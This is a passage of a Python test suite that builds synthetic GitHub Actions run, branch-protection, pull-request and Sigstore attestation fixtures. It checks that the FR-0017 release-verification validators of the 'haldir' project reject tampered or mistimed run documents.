#!/usr/bin/env python3
"""Offline adversarial tests for the FR-0017 epoch-18 trust root."""

from __future__ import annotations

import base64
import copy
import gc
import hashlib
import importlib.util
import json
import os
import signal
import subprocess
import sys
import tempfile
import time
import tomllib
import unittest
import warnings
from collections import Counter
from contextlib import contextmanager
from datetime import datetime, timezone
from pathlib import Path
from types import ModuleType
from typing import Any, Iterator
from unittest import mock


ROOT = Path(__file__).resolve().parents[2]
COMMIT = "a" * 40
TREE = "b" * 40
RUN_ID = 42_424_242
RUN_NUMBER = 707
ATTEMPT = 2


def load_module(relative: str, name: str) -> ModuleType:
    specification = importlib.util.spec_from_file_location(name, ROOT / relative)
    if specification is None or specification.loader is None:
        raise RuntimeError(relative)
    module = importlib.util.module_from_spec(specification)
    specification.loader.exec_module(module)
    return module


PROTOCOL = load_module(
    "tools/release/framework_recovery_fr_0017.py",
    "_haldir_fr0017_test_protocol",
)
RESULT = load_module(
    "tools/release/framework_recovery_fr_0017_result.py",
    "_haldir_fr0017_test_result",
)
BRIDGE = load_module(
    "tools/release/verify-framework-recovery-fr-0017.py",
    "_haldir_fr0017_test_bridge",
)
CAPTURE = load_module(
    "tools/release/framework_recovery_fr_0017_capture.py",
    "_haldir_fr0017_test_capture",
)
PINS = load_module("tools/verify-ci-pins.py", "_haldir_fr0017_test_pins")


def utc(hour: int, minute: int, second: int = 0) -> str:
    return f"2026-07-29T{hour:02d}:{minute:02d}:{second:02d}Z"


def utc_fraction(
    hour: int,
    minute: int,
    second: int,
    microsecond: int,
) -> str:
    return f"2026-07-29T{hour:02d}:{minute:02d}:{second:02d}.{microsecond:06d}Z"


def job_at(
    name: str,
    database_id: int,
    started_at: str,
    completed_at: str,
) -> dict:
    return {
        "completedAt": completed_at,
        "conclusion": "success",
        "databaseId": database_id,
        "name": name,
        "startedAt": started_at,
        "status": "completed",
        "steps": [
            {
                "completedAt": completed_at,
                "conclusion": "success",
                "name": (
                    PROTOCOL.DISPATCHER_STEP_NAME
                    if name == "supply-chain"
                    else "complete"
                ),
                "number": 1,
                "startedAt": started_at,
                "status": "completed",
            }
        ],
        "url": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/job/{database_id}"
        ),
    }


def job(name: str, database_id: int, start: int, end: int) -> dict:
    return job_at(name, database_id, utc(12, start), utc(12, end))


def run_documents(workflow: str = "ci") -> tuple[dict, dict]:
    if workflow == "ci":
        names = sorted(PROTOCOL.EPOCH18_CI_JOB_NAMES)
        producer = "supply-chain"
        attester = "attest-ci-audit-result"
    else:
        names = sorted(PROTOCOL.EPOCH18_FORMAL_JOB_NAMES)
        producer = "tlc-model-check"
        attester = "attest-formal-audit-result"
    jobs = []
    for index, name in enumerate(names, start=1):
        start, end = (1, 4) if name == producer else (1, 3)
        if name == attester:
            start, end = 6, 8
        jobs.append(job(name, 50_000 + index, start, end))
    common = {
        "attempt": ATTEMPT,
        "conclusion": "success",
        "createdAt": utc(10, 0),
        "databaseId": RUN_ID,
        "event": "push",
        "headBranch": "main",
        "headSha": COMMIT,
        "jobs": jobs,
        "number": RUN_NUMBER,
        "status": "completed",
        "updatedAt": utc(12, 10),
        "workflowDatabaseId": PROTOCOL.WORKFLOW_DATABASE_IDS[workflow],
        "workflowName": workflow,
    }
    ordinary = {
        **common,
        "url": f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}",
    }
    attempt = {
        **common,
        "createdAt": utc(12, 0),
        "startedAt": utc(12, 0),
        "url": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/attempts/{ATTEMPT}"
        ),
    }
    return ordinary, attempt


def live_run_documents(
    attempt_number: int,
    *,
    workflow: str = "ci",
) -> tuple[dict, dict]:
    if workflow == "ci":
        names = sorted(PROTOCOL.EPOCH18_CI_JOB_NAMES)
        producer = "supply-chain"
        attester = "attest-ci-audit-result"
    else:
        names = sorted(PROTOCOL.EPOCH18_FORMAL_JOB_NAMES)
        producer = "tlc-model-check"
        attester = "attest-formal-audit-result"
    if attempt_number == 2:
        attempt_started = utc(17, 57, 8)
        attempt_created = utc(17, 57, 10)
        attempt_updated = utc(17, 58, 57)
        carried_started = utc(17, 55, 27)
        carried_completed = utc(17, 56, 30)
        producer_started = utc(17, 57, 19)
        producer_completed = utc(17, 58, 40)
        attester_started = utc(17, 58, 51)
        attester_completed = utc(17, 58, 56)
    elif attempt_number == 3:
        attempt_started = utc(18, 3, 46)
        attempt_created = utc(18, 3, 52)
        attempt_updated = utc(18, 5, 32)
        carried_started = utc(18, 3, 54)
        carried_completed = utc(18, 4, 45)
        producer_started = utc(18, 3, 54)
        producer_completed = utc(18, 5, 15)
        attester_started = utc(18, 5, 25)
        attester_completed = utc(18, 5, 31)
    else:
        raise ValueError("live fixture only models attempts 2 and 3")
    jobs = []
    for index, name in enumerate(names, start=1):
        started_at = carried_started
        completed_at = carried_completed
        if name == producer:
            started_at = producer_started
            completed_at = producer_completed
        elif name == attester:
            started_at = attester_started
            completed_at = attester_completed
        jobs.append(job_at(name, 70_000 + index, started_at, completed_at))
    common = {
        "attempt": attempt_number,
        "conclusion": "success",
        "createdAt": utc(17, 55, 25),
        "databaseId": RUN_ID,
        "event": "push",
        "headBranch": "main",
        "headSha": COMMIT,
        "jobs": jobs,
        "number": RUN_NUMBER,
        "status": "completed",
        "updatedAt": attempt_updated,
        "workflowDatabaseId": PROTOCOL.WORKFLOW_DATABASE_IDS[workflow],
        "workflowName": workflow,
    }
    ordinary = {
        **common,
        "url": f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}",
    }
    attempt = {
        **common,
        "createdAt": attempt_created,
        "startedAt": attempt_started,
        "url": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/attempts/{attempt_number}"
        ),
    }
    return ordinary, attempt


def set_job_times(
    ordinary: dict,
    attempt: dict,
    name: str,
    *,
    started_at: str,
    completed_at: str,
) -> None:
    for document in (ordinary, attempt):
        selected = next(item for item in document["jobs"] if item["name"] == name)
        selected["startedAt"] = started_at
        selected["completedAt"] = completed_at
        selected["steps"][0]["startedAt"] = started_at
        selected["steps"][0]["completedAt"] = completed_at


def repository_identity() -> dict:
    return {
        "id": BRIDGE.REPOSITORY_ID,
        "name": BRIDGE.REPOSITORY_NAME,
        "full_name": BRIDGE.REPOSITORY_FULL_NAME,
        "default_branch": BRIDGE.REPOSITORY_DEFAULT_BRANCH,
        "fork": False,
        "owner": {
            "id": BRIDGE.MAIN_RULESET_OWNER_ID,
            "login": BRIDGE.REPOSITORY_OWNER_LOGIN,
            "type": "User",
        },
        "has_parent": False,
        "has_source": False,
    }


def ruleset_documents() -> tuple[list, dict, list, list, dict]:
    ruleset_id = 8_181
    version_id = 9_191
    node_id = "RRS_fixture"
    api_url = f"https://api.github.com/repos/sepahead/haldir/rulesets/{ruleset_id}"
    summary = {
        "id": ruleset_id,
        "name": BRIDGE.MAIN_RULESET_NAME,
        "target": "branch",
        "enforcement": "active",
        "source_type": "Repository",
        "source": "sepahead/haldir",
        "node_id": node_id,
        "_links": {
            "self": {"href": api_url},
            "html": {"href": f"https://github.com/sepahead/haldir/rules/{ruleset_id}"},
        },
        "created_at": "2026-07-29T20:59:51.674+02:00",
        "updated_at": "2026-07-29T20:59:51.694+02:00",
    }
    detail = {
        **summary,
        "bypass_actors": [
            {
                "actor_id": BRIDGE.MAIN_RULESET_OWNER_ID,
                "actor_type": "User",
                "bypass_mode": "always",
            }
        ],
        "conditions": {
            "ref_name": {
                "exclude": [],
                "include": ["refs/heads/main"],
            }
        },
        "rules": [{"type": "update"}],
        "current_user_can_bypass": "always",
    }
    effective = [
        {
            "type": "update",
            "ruleset_id": ruleset_id,
            "ruleset_source_type": "Repository",
            "ruleset_source": "sepahead/haldir",
        }
    ]
    history = [
        {
            "version_id": version_id,
            "updated_at": "2026-07-29T20:59:51.757+02:00",
            "actor": {
                "id": BRIDGE.MAIN_RULESET_OWNER_ID,
                "type": "User",
            },
        }
    ]
    version = {
        **history[0],
        "state": {
            "id": ruleset_id,
            "name": BRIDGE.MAIN_RULESET_NAME,
            "target": "branch",
            "source_type": "Repository",
            "source": "sepahead/haldir",
            "enforcement": "active",
            "conditions": copy.deepcopy(detail["conditions"]),
            "rules": [{"type": "update"}],
            "updated_at": None,
            "bypass_actors": copy.deepcopy(detail["bypass_actors"]),
            "current_user_can_bypass": "always",
        },
    }
    return [summary], detail, effective, history, version


def branch_protection_record(qualification_commit: str = COMMIT) -> dict:
    (
        ruleset_list,
        ruleset_by_id,
        effective_rules,
        ruleset_history,
        ruleset_version,
    ) = ruleset_documents()
    reference = {
        "ref": "refs/heads/main",
        "node_id": "MDM6UmVmMTI5MjgwMjU5MjpyZWZzL2hlYWRzL21haW4=",
        "url": "https://api.github.com/repos/sepahead/haldir/git/refs/heads/main",
        "object": {
            "sha": qualification_commit,
            "type": "commit",
            "url": (
                "https://api.github.com/repos/sepahead/haldir/git/commits/"
                f"{qualification_commit}"
            ),
        },
    }
    contexts = sorted(BRIDGE.REQUIRED_PRE_ACCEPT_CHECKS)
    base = "https://api.github.com/repos/sepahead/haldir/branches/main/protection"
    protection = {
        "url": base,
        "required_status_checks": {
            "url": f"{base}/required_status_checks",
            "strict": True,
            "contexts": contexts,
            "contexts_url": f"{base}/required_status_checks/contexts",
            "checks": [
                {
                    "app_id": BRIDGE.GITHUB_ACTIONS_APP_ID,
                    "context": context,
                }
                for context in contexts
            ],
        },
        "enforce_admins": {
            "url": f"{base}/enforce_admins",
            "enabled": True,
        },
        "required_linear_history": {"enabled": True},
        "required_signatures": {
            "url": f"{base}/required_signatures",
            "enabled": True,
        },
        "allow_force_pushes": {"enabled": False},
        "allow_deletions": {"enabled": False},
        "block_creations": {"enabled": False},
        "required_conversation_resolution": {"enabled": False},
        "lock_branch": {"enabled": False},
        "allow_fork_syncing": {"enabled": False},
    }
    return {
        "schema_version": "1.0.0",
        "protocol": "HALDIR_FR_0017_BRANCH_PROTECTION_CAPTURE_V1",
        "repository": repository_identity(),
        "branch": "main",
        "observed_commit": qualification_commit,
        "ref_before": reference,
        "ref_after": copy.deepcopy(reference),
        "protection": protection,
        "ruleset_list": ruleset_list,
        "ruleset_by_id": ruleset_by_id,
        "effective_rules": effective_rules,
        "ruleset_history": ruleset_history,
        "ruleset_version": ruleset_version,
        "capture": {
            "commit_before_command": (
                "gh api --method GET repos/sepahead/haldir/git/ref/heads/main"
            ),
            "commit_after_command": (
                "gh api --method GET repos/sepahead/haldir/git/ref/heads/main"
            ),
            "protection_command": (
                "gh api --method GET repos/sepahead/haldir/branches/main/protection"
            ),
            "repository_command": ("gh api --method GET repos/sepahead/haldir"),
            "ruleset_list_command": (
                "gh api --method GET repos/sepahead/haldir/rulesets"
            ),
            "ruleset_get_command": (
                "gh api --method GET repos/sepahead/haldir/rulesets/8181"
            ),
            "ruleset_history_command": (
                "gh api --method GET repos/sepahead/haldir/rulesets/8181/history"
            ),
            "ruleset_version_command": (
                "gh api --method GET repos/sepahead/haldir/rulesets/8181/history/9191"
            ),
            "effective_rules_command": (
                "gh api --method GET repos/sepahead/haldir/rules/branches/main"
            ),
            "captured_at_utc": utc(12, 0),
            "transport": "GITHUB_API_OVER_TLS",
            "result": "PASS",
        },
        "authority": {
            "cryptographic_proof": False,
            "durable_external_state_proof": False,
            "release_authority": False,
            "transport_observation": "GITHUB_API_OVER_TLS",
        },
    }


def pull_request_run(workflow: str, run_id: int) -> dict:
    required_names = (
        PROTOCOL.CI_JOB_NAMES if workflow == "ci" else PROTOCOL.FORMAL_JOB_NAMES
    )
    attestation_name = (
        "attest-ci-audit-result" if workflow == "ci" else "attest-formal-audit-result"
    )
    jobs = []
    for index, name in enumerate(sorted(required_names), start=1):
        database_id = run_id * 10 + index
        jobs.append(
            {
                "completedAt": utc(11, 8),
                "conclusion": "success",
                "databaseId": database_id,
                "name": name,
                "startedAt": utc(11, 1),
                "status": "completed",
                "steps": [
                    {
                        "completedAt": utc(11, 2),
                        "conclusion": "success",
                        "name": "Run actions/checkout@fixture",
                        "number": 1,
                        "startedAt": utc(11, 1),
                        "status": "completed",
                    },
                    {
                        "completedAt": utc(11, 3),
                        "conclusion": "skipped",
                        "name": "Signed-linear step omitted on pull request",
                        "number": 2,
                        "startedAt": utc(11, 3),
                        "status": "completed",
                    },
                    {
                        "completedAt": utc(11, 8),
                        "conclusion": "success",
                        "name": (
                            PROTOCOL.DISPATCHER_STEP_NAME
                            if name == "supply-chain"
                            else "Complete job"
                        ),
                        "number": 3,
                        "startedAt": utc(11, 7),
                        "status": "completed",
                    },
                ],
                "url": (
                    f"https://github.com/sepahead/haldir/actions/runs/{run_id}"
                    f"/job/{database_id}"
                ),
            }
        )
    attestation_id = run_id * 10 + len(required_names) + 1
    jobs.append(
        {
            "completedAt": utc(11, 9),
            "conclusion": "skipped",
            "databaseId": attestation_id,
            "name": attestation_name,
            "startedAt": utc(11, 9),
            "status": "completed",
            "steps": [],
            "url": (
                f"https://github.com/sepahead/haldir/actions/runs/{run_id}"
                f"/job/{attestation_id}"
            ),
        }
    )
    return {
        "attempt": 1,
        "conclusion": "success",
        "createdAt": utc(11, 0),
        "databaseId": run_id,
        "event": "pull_request",
        "headBranch": "recovery/fr0017",
        "headSha": COMMIT,
        "jobs": jobs,
        "number": 88 if workflow == "ci" else 44,
        "status": "completed",
        "updatedAt": utc(11, 10),
        "url": f"https://github.com/sepahead/haldir/actions/runs/{run_id}",
        "workflowDatabaseId": PROTOCOL.WORKFLOW_DATABASE_IDS[workflow],
        "workflowName": workflow,
    }


def run_pull_request_association(run_id: int, number: int = 17) -> dict:
    return {
        "run_id": run_id,
        "run_api_url": (
            f"https://api.github.com/repos/sepahead/haldir/actions/runs/{run_id}"
        ),
        "pull_request": {
            "number": number,
            "database_id": 1_717,
            "api_url": (f"https://api.github.com/repos/sepahead/haldir/pulls/{number}"),
            "head": {
                "ref": "recovery/fr0017",
                "sha": COMMIT,
                "repository_id": BRIDGE.REPOSITORY_ID,
            },
            "base": {
                "ref": "main",
                "sha": BRIDGE.PARENT,
                "repository_id": BRIDGE.REPOSITORY_ID,
            },
        },
    }


def pull_request_record() -> dict:
    number = 17
    merge_commit = "c" * 40
    ci_run_id = 71_001
    formal_run_id = 71_002
    pull_request = {
        "number": number,
        "database_id": 1_717,
        "node_id": "PR_kwDO_fixture",
        "api_url": (f"https://api.github.com/repos/sepahead/haldir/pulls/{number}"),
        "html_url": f"https://github.com/sepahead/haldir/pull/{number}",
        "state": "closed",
        "draft": False,
        "locked": False,
        "merged": False,
        "merge_commit_sha": merge_commit,
        "created_at": utc(10, 0),
        "updated_at": utc(11, 20),
        "closed_at": utc(11, 20),
        "merged_at": None,
        "head": {
            "ref": "recovery/fr0017",
            "sha": COMMIT,
            "repository_id": BRIDGE.REPOSITORY_ID,
        },
        "base": {
            "ref": "main",
            "sha": BRIDGE.PARENT,
            "repository_id": BRIDGE.REPOSITORY_ID,
        },
    }
    observed_pull_request = copy.deepcopy(pull_request)
    observed_pull_request.update(
        {
            "state": "open",
            "updated_at": utc(11, 14),
            "closed_at": None,
        }
    )
    return {
        "schema_version": "1.0.0",
        "protocol": "HALDIR_FR_0017_PULL_REQUEST_QUALIFICATION_V1",
        "repository": repository_identity(),
        "pull_request": pull_request,
        "synthetic_merge": {
            "sha": merge_commit,
            "tree": TREE,
            "parents": [
                {
                    "sha": BRIDGE.PARENT,
                    "url": (
                        "https://api.github.com/repos/sepahead/haldir/git/"
                        f"commits/{BRIDGE.PARENT}"
                    ),
                },
                {
                    "sha": COMMIT,
                    "url": (
                        "https://api.github.com/repos/sepahead/haldir/git/"
                        f"commits/{COMMIT}"
                    ),
                },
            ],
            "api_url": (
                "https://api.github.com/repos/sepahead/haldir/git/commits/"
                f"{merge_commit}"
            ),
        },
        "runs": {
            "ci": pull_request_run("ci", ci_run_id),
            "formal": pull_request_run("formal", formal_run_id),
        },
        "run_pull_request_associations": {
            "captured_at_utc": utc(11, 15),
            "observed_pull_request": observed_pull_request,
            "ci": run_pull_request_association(ci_run_id),
            "formal": run_pull_request_association(formal_run_id),
        },
        "github_event_contract": {
            "checkout_sha": "PULL_REQUEST_SYNTHETIC_MERGE_COMMIT",
            "run_head_sha": "PULL_REQUEST_HEAD_COMMIT",
            "workflow_checkout_ref_override": False,
        },
        "capture": {
            "commands": BRIDGE._pull_request_capture_commands(
                number=number,
                merge_commit=merge_commit,
                ci_run_id=ci_run_id,
                formal_run_id=formal_run_id,
            ),
            "captured_at_utc": utc(11, 30),
            "transport": "GITHUB_API_OVER_TLS",
            "result": "PASS",
        },
        "authority": {
            "durable_external_state_proof": False,
            "merge_commit_signature_claimed": False,
            "release_authority": False,
            "transport_observation": "GITHUB_API_OVER_TLS",
        },
    }


def open_pull_request_snapshot() -> dict:
    final = pull_request_record()
    associations = final["run_pull_request_associations"]
    pull_request = associations["observed_pull_request"]
    return {
        "schema_version": "1.0.0",
        "protocol": "HALDIR_FR_0017_OPEN_PULL_REQUEST_SNAPSHOT_V1",
        "repository": copy.deepcopy(final["repository"]),
        "pull_request": copy.deepcopy(pull_request),
        "synthetic_merge": copy.deepcopy(final["synthetic_merge"]),
        "runs": copy.deepcopy(final["runs"]),
        "run_pull_request_associations": {
            "ci": copy.deepcopy(associations["ci"]),
            "formal": copy.deepcopy(associations["formal"]),
        },
        "capture": {
            "commands": BRIDGE._pull_request_open_capture_commands(
                number=pull_request["number"],
                merge_commit=pull_request["merge_commit_sha"],
                ci_run_id=associations["ci"]["run_id"],
                formal_run_id=associations["formal"]["run_id"],
            ),
            "captured_at_utc": associations["captured_at_utc"],
            "transport": "GITHUB_API_OVER_TLS",
            "result": "PASS",
        },
        "authority": {
            "durable_external_state_proof": False,
            "release_authority": False,
            "transport_observation": "GITHUB_API_OVER_TLS",
        },
    }


def hosted_settings_record(qualification_commit: str = COMMIT) -> dict:
    reference = {
        "ref": "refs/heads/main",
        "node_id": "REF_kwDO_settings_fixture",
        "url": "https://api.github.com/repos/sepahead/haldir/git/refs/heads/main",
        "object": {
            "sha": qualification_commit,
            "type": "commit",
            "url": (
                "https://api.github.com/repos/sepahead/haldir/git/commits/"
                f"{qualification_commit}"
            ),
        },
    }
    return {
        "schema_version": "1.0.0",
        "protocol": "HALDIR_FR_0017_HOSTED_SETTINGS_CAPTURE_V1",
        "repository": repository_identity(),
        "observed_commit": qualification_commit,
        "ref_before": reference,
        "ref_after": copy.deepcopy(reference),
        "settings": {
            "actions_permissions": {
                "allowed_actions": "selected",
                "enabled": True,
                "selected_actions_url": (
                    "https://api.github.com/repositories/1292802592/actions/"
                    "permissions/selected-actions"
                ),
                "sha_pinning_required": True,
            },
            "dependabot_security_updates": {
                "enabled": True,
                "paused": False,
            },
            "fork_pull_request_contributor_approval": {
                "approval_policy": "first_time_contributors"
            },
            "private_vulnerability_reporting": {"enabled": True},
            "repository_security_and_analysis": {
                "dependabot_security_updates": {"status": "enabled"},
                "secret_scanning": {"status": "enabled"},
                "secret_scanning_non_provider_patterns": {"status": "disabled"},
                "secret_scanning_push_protection": {"status": "enabled"},
                "secret_scanning_validity_checks": {"status": "disabled"},
            },
            "selected_actions": {
                "github_owned_allowed": True,
                "patterns_allowed": [],
                "verified_allowed": False,
            },
            "vulnerability_alerts": {
                "enabled": True,
                "http_status": 204,
            },
            "workflow_permissions": {
                "can_approve_pull_request_reviews": False,
                "default_workflow_permissions": "read",
            },
        },
        "history_scope": {
            "activation_commit_self_observed": False,
            "durable_historical_transition_proof": False,
            "observation_scope": "QUALIFICATION_COMMIT_ONLY",
            "settings_transition_time_claimed": False,
        },
        "capture": {
            "commands": BRIDGE._hosted_settings_capture_commands(),
            "captured_at_utc": utc(11, 30),
            "transport": "GITHUB_API_OVER_TLS",
            "result": "PASS",
        },
        "authority": {
            "cryptographic_proof": False,
            "durable_external_state_proof": False,
            "release_authority": False,
            "transport_observation": "GITHUB_API_OVER_TLS",
        },
    }


def file_record(path: str, seed: str) -> dict:
    payload = seed.encode()
    framed = b"blob " + str(len(payload)).encode() + b"\0" + payload
    return {
        "path": path,
        "git_mode": "100644",
        "git_object_type": "blob",
        "git_object_id": hashlib.sha1(framed, usedforsecurity=False).hexdigest(),
        "sha256": hashlib.sha256(payload).hexdigest(),
        "bytes": len(payload),
    }


def result_payload(workflow: str = "ci", attempt: int = ATTEMPT) -> tuple[bytes, list]:
    contract = PROTOCOL.RESULT_CONTRACT[workflow]
    materials = [
        file_record(path, f"material-{index}")
        for index, path in enumerate(contract["material_paths"])
    ]
    value = {
        "schema_version": "1.0.0",
        "protocol": PROTOCOL.RESULT_PROTOCOL,
        "repository": {
            "name": PROTOCOL.REPOSITORY,
            "database_id": PROTOCOL.REPOSITORY_ID,
            "owner_database_id": PROTOCOL.REPOSITORY_OWNER_ID,
        },
        "subject": {
            "commit": COMMIT,
            "tree": TREE,
            "ref": "refs/heads/main",
            "event": "push",
        },
        "execution": {
            "workflow": workflow,
            "workflow_ref": (
                f"sepahead/haldir/{contract['workflow_path']}@refs/heads/main"
            ),
            "job": contract["job"],
            "run_id": RUN_ID,
            "run_attempt": attempt,
            "run_number": RUN_NUMBER,
            "command": contract["command"],
            "result": "PASS",
        },
        "materials": materials,
        "authority": {
            "provenance_only": True,
            "release_authority": False,
            "deployment_authority": False,
            "publication_authority": False,
            "tag_authority": False,
        },
    }
    return PROTOCOL.canonical_json_bytes(value, pretty=True), materials


def artifact(payload: bytes, workflow: str = "ci", attempt: int = ATTEMPT) -> dict:
    artifact_id = 9_001
    return {
        "archive_download_url": (
            "https://api.github.com/repos/sepahead/haldir/actions/artifacts/"
            f"{artifact_id}/zip"
        ),
        "created_at": utc(12, 2),
        "digest": "sha256:" + hashlib.sha256(payload).hexdigest(),
        "expired": False,
        "expires_at": "2026-10-27T12:02:00Z",
        "id": artifact_id,
        "name": f"epoch-18-{workflow}-result-attempt-{attempt}.json",
        "node_id": "MDg6QXJ0aWZhY3Q5MDAx",
        "size_in_bytes": len(payload),
        "updated_at": utc(12, 3),
        "url": (
            "https://api.github.com/repos/sepahead/haldir/actions/artifacts/"
            f"{artifact_id}"
        ),
        "workflow_run": {
            "head_branch": "main",
            "head_repository_id": PROTOCOL.REPOSITORY_ID,
            "head_sha": COMMIT,
            "id": RUN_ID,
            "repository_id": PROTOCOL.REPOSITORY_ID,
        },
    }


def attestation_fixture(
    payload: bytes,
    workflow: str = "ci",
    attempt: int = ATTEMPT,
) -> tuple[bytes, list]:
    statement = PROTOCOL._expected_attestation_statement(
        workflow=workflow,
        result_digest=hashlib.sha256(payload).hexdigest(),
        subject_commit=COMMIT,
        expected_ref="refs/heads/main",
        run_id=RUN_ID,
        attempt=attempt,
    )
    bundle = {
        "mediaType": "application/vnd.dev.sigstore.bundle.v0.3+json",
        "verificationMaterial": {"tlogEntries": [{"logIndex": "1"}]},
        "dsseEnvelope": {
            "payload": base64.b64encode(
                json.dumps(statement, separators=(",", ":")).encode()
            ).decode(),
            "payloadType": "application/vnd.in-toto+json",
            "signatures": [{"sig": "AA=="}],
        },
    }
    bundle_payload = (
        json.dumps(bundle, separators=(",", ":"), sort_keys=True) + "\n"
    ).encode()
    workflow_path = PROTOCOL.RESULT_CONTRACT[workflow]["workflow_path"]
    identity = f"https://github.com/sepahead/haldir/{workflow_path}@refs/heads/main"
    certificate = {
        "subjectAlternativeName": identity,
        "issuer": "https://token.actions.githubusercontent.com",
        "githubWorkflowTrigger": "push",
        "githubWorkflowSHA": COMMIT,
        "githubWorkflowName": workflow,
        "githubWorkflowRepository": "sepahead/haldir",
        "githubWorkflowRef": "refs/heads/main",
        "buildSignerURI": identity,
        "buildSignerDigest": COMMIT,
        "runnerEnvironment": "github-hosted",
        "sourceRepositoryURI": "https://github.com/sepahead/haldir",
        "sourceRepositoryDigest": COMMIT,
        "sourceRepositoryRef": "refs/heads/main",
        "sourceRepositoryIdentifier": str(PROTOCOL.REPOSITORY_ID),
        "sourceRepositoryOwnerURI": "https://github.com/sepahead",
        "sourceRepositoryOwnerIdentifier": str(PROTOCOL.REPOSITORY_OWNER_ID),
        "buildConfigURI": identity,
        "buildConfigDigest": COMMIT,
        "buildTrigger": "push",
        "runInvocationURI": (
            f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}"
            f"/attempts/{attempt}"
        ),
        "sourceRepositoryVisibilityAtSigning": "public",
    }
    receipt = [
        {
            "attestation": {
                "bundle": bundle,
                "bundle_url": "",
                "initiator": "",
            },
            "verificationResult": {
                "mediaType": (
                    "application/vnd.dev.sigstore.verificationresult+json;version=0.1"
                ),
                "statement": statement,
                "signature": {"certificate": certificate},
                "verifiedTimestamps": [
                    {
                        "type": "Tlog",
                        "uri": "https://rekor.sigstore.dev",
                        "timestamp": utc(12, 7),
                    }
                ],
            },
        }
    ]
    return bundle_payload, receipt


@contextmanager
def changed_directory(path: Path) -> Iterator[None]:
    previous = Path.cwd()
    os.chdir(path)
    try:
        yield
    finally:
        os.chdir(previous)


class RunDocumentTests(unittest.TestCase):
    def validate(
        self,
        ordinary: dict,
        attempt: dict,
        *,
        workflow: str = "ci",
    ) -> dict:
        return PROTOCOL.validate_epoch18_run_documents(
            ordinary,
            attempt,
            workflow=workflow,
            subject_commit=COMMIT,
            expected_ref="refs/heads/main",
        )

    def test_attempt_two_is_valid_and_fully_bound(self) -> None:
        ordinary, attempt = run_documents()
        result = self.validate(ordinary, attempt)
        self.assertEqual(result["attempt"], 2)
        self.assertEqual(result["run_id"], RUN_ID)
        self.assertEqual(set(result["jobs"]), PROTOCOL.EPOCH18_CI_JOB_NAMES)

    def test_main_dispatcher_is_exactly_one_completed_success(self) -> None:
        ordinary, attempt = run_documents()
        result = self.validate(ordinary, attempt)
        matches = [
            step
            for step in result["jobs"]["supply-chain"]["steps"]
            if step["name"] == PROTOCOL.DISPATCHER_STEP_NAME
        ]
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0]["status"], "completed")
        self.assertEqual(matches[0]["conclusion"], "success")

    def test_main_dispatcher_missing_duplicate_and_wrong_job_are_rejected(self) -> None:
        for mutation in ("missing", "duplicate", "wrong_job"):
            ordinary, attempt = run_documents()
            mutated_jobs: set[int] = set()
            for document in (ordinary, attempt):
                supply = next(
                    job for job in document["jobs"] if job["name"] == "supply-chain"
                )
                if id(supply) in mutated_jobs:
                    continue
                mutated_jobs.add(id(supply))
                if mutation == "duplicate":
                    duplicate = copy.deepcopy(supply["steps"][0])
                    duplicate["number"] = 2
                    supply["steps"].append(duplicate)
                else:
                    supply["steps"][0]["name"] = "different successful step"
                    if mutation == "wrong_job":
                        target = next(
                            job
                            for job in document["jobs"]
                            if job["name"] == "build-test"
                        )
                        target["steps"][0]["name"] = PROTOCOL.DISPATCHER_STEP_NAME
            with (
                self.subTest(mutation=mutation),
                self.assertRaisesRegex(ValueError, "DISPATCHER_STEP"),
            ):
                self.validate(ordinary, attempt)

    def test_main_dispatcher_skipped_failed_and_wrong_name_are_rejected(self) -> None:
        for field, value in (
            ("conclusion", "skipped"),
            ("conclusion", "failure"),
            ("name", "Verify epoch-18 recovery primitives for another event"),
        ):
            ordinary, attempt = run_documents()
            mutated_jobs = set()
            for document in (ordinary, attempt):
                supply = next(
                    job for job in document["jobs"] if job["name"] == "supply-chain"
                )
                if id(supply) in mutated_jobs:
                    continue
                mutated_jobs.add(id(supply))
                supply["steps"][0][field] = value
            with self.subTest(field=field, value=value), self.assertRaises(ValueError):
                self.validate(ordinary, attempt)

    def test_distinct_reordered_step_numbers_are_rejected_in_both_documents(
        self,
    ) -> None:
        for document_name in ("ordinary", "attempt"):
            ordinary, attempt = run_documents()
            ordinary["jobs"] = copy.deepcopy(ordinary["jobs"])
            attempt["jobs"] = copy.deepcopy(attempt["jobs"])
            document = ordinary if document_name == "ordinary" else attempt
            selected = next(
                job for job in document["jobs"] if job["name"] == "build-test"
            )
            first = selected["steps"][0]
            second = copy.deepcopy(first)
            first["number"] = 2
            second["number"] = 1
            selected["steps"].append(second)
            with (
                self.subTest(document=document_name),
                self.assertRaisesRegex(ValueError, "FR0017_JOB_STEPS"),
            ):
                self.validate(ordinary, attempt)

    def test_live_attempt_two_selective_rerun_semantics(self) -> None:
        ordinary, attempt = live_run_documents(2)
        result = self.validate(ordinary, attempt)
        created = datetime.fromisoformat(attempt["createdAt"].replace("Z", "+00:00"))
        started = datetime.fromisoformat(attempt["startedAt"].replace("Z", "+00:00"))
        self.assertEqual((created - started).total_seconds(), 2)
        carried = result["jobs"]["build-test"]
        self.assertLess(carried["started"], started)
        self.assertGreaterEqual(result["jobs"]["supply-chain"]["started"], started)
        self.assertGreaterEqual(
            result["jobs"]["attest-ci-audit-result"]["started"],
            started,
        )

    def test_live_attempt_three_full_rerun_semantics(self) -> None:
        ordinary, attempt = live_run_documents(3)
        result = self.validate(ordinary, attempt)
        created = datetime.fromisoformat(attempt["createdAt"].replace("Z", "+00:00"))
        started = datetime.fromisoformat(attempt["startedAt"].replace("Z", "+00:00"))
        self.assertEqual((created - started).total_seconds(), 6)
        self.assertTrue(
            all(item["started"] >= started for item in result["jobs"].values())
        )

    def test_carried_unrelated_success_is_accepted(self) -> None:
        ordinary, attempt = live_run_documents(2)
        set_job_times(
            ordinary,
            attempt,
            "build-test",
            started_at=utc(17, 55, 25),
            completed_at=utc(17, 56, 0),
        )
        self.validate(ordinary, attempt)

    def test_carried_current_attempt_critical_jobs_are_rejected(self) -> None:
        for name in ("supply-chain", "attest-ci-audit-result"):
            ordinary, attempt = live_run_documents(2)
            set_job_times(
                ordinary,
                attempt,
                name,
                started_at=utc(17, 57, 7),
                completed_at=utc(17, 57, 30),
            )
            with (
                self.subTest(name=name),
                self.assertRaisesRegex(
                    ValueError,
